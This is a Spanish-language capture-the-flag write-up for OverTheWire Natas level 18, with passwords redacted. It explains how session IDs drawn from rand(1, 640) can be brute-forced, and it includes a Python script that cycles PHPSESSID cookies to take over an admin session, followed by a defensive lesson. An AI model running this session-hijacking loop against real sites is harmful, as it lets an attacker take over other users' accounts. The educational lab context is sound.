# Natas Level 18 → Level 19

> ⚠️ Spoilers: las contraseñas están omitidas (`[redacted]`). Lo importante es el método.

- **URL:** `http://natas18.natas.labs.overthewire.org`
- **Credenciales:** `natas18` / `[redacted]`

## Análisis y Explotación
La página pide loguearse como `admin` para mostrar las credenciales de natas19. El código fuente revela la lógica de sesión:

```php
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
        /* This method ... has been disabled for now. */
        //return 1;
    }
    return 0;
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        // ... password natas19
    } else {
        print "You are logged in as a regular user. ...";
    }
}
```

**Lo que hay que notar:**
1. El login como `admin` **no sirve**: `isValidAdminLogin()` siempre devuelve `0` (el `return 1` está comentado).
2. Lo único que distingue a un admin de un usuario normal es su **sesión**: `$_SESSION["admin"] == 1`.
3. Cada sesión se identifica por la cookie **`PHPSESSID`**, y ese ID se genera con `rand(1, 640)` — un rango **chico y predecible**.

### El vector: Session-ID prediction (brute force)

Si un admin inició sesión alguna vez, su sesión quedó guardada en el servidor bajo **alguno** de los 640 IDs posibles, con `admin = 1`. No sabemos cuál, pero son solo 640 — se pueden probar todos.

El `PHPSESSID` es una cookie que el cliente controla, así que basta con recorrer `1..640`, mandar cada número como cookie, y mirar la respuesta: cuando diga `"You are an admin"` en vez de `"regular user"`, ese era el ID del admin y ahí sale el password de natas19.

### Automatización con Python

A diferencia de los niveles anteriores, el valor que se cambia no va en `data` (formulario) sino en la **cookie** — parámetro `cookies` de `requests`:

```python
import requests

URL  = "http://natas18.natas.labs.overthewire.org/"
USER = "natas18"
PASS = "[redacted]"

print("[*] Buscando el PHPSESSID del admin (1 a 640)...")
for i in range(1, 641):
    r = requests.get(URL, auth=(USER, PASS), cookies={"PHPSESSID": str(i)})
    if "You are an admin" in r.text:
        print(f"[+] ID de admin encontrado: {i}")
        print(r.text)
        break
    print(f"    probando {i}...", end="\r")
```

Puntos clave:
- `cookies={"PHPSESSID": str(i)}` → cambia la cookie en cada vuelta; el valor va como **string** (las cookies son texto)
- `if "You are an admin" in r.text` → detecta el acierto
- `print(r.text)` → vuelca el HTML, que incluye el password de natas19

En esta ejecución el ID del admin resultó ser **119**, y la respuesta mostró las credenciales de natas19.

- **Password obtenida (`natas19`):** `[redacted]`

## Lección aprendida
Los identificadores de sesión deben ser **largos, aleatorios e impredecibles** (PHP por defecto usa 128+ bits). Acá el ID salía de `rand(1, 640)`: un espacio de solo 640 valores que se recorre entero en segundos. Nunca hay que generar session IDs con un rango acotado ni con un PRNG débil — un atacante puede adivinar o forzar la sesión de otro usuario (session prediction / hijacking). La defensa es usar el manejador de sesiones nativo sin tocar la generación del ID.
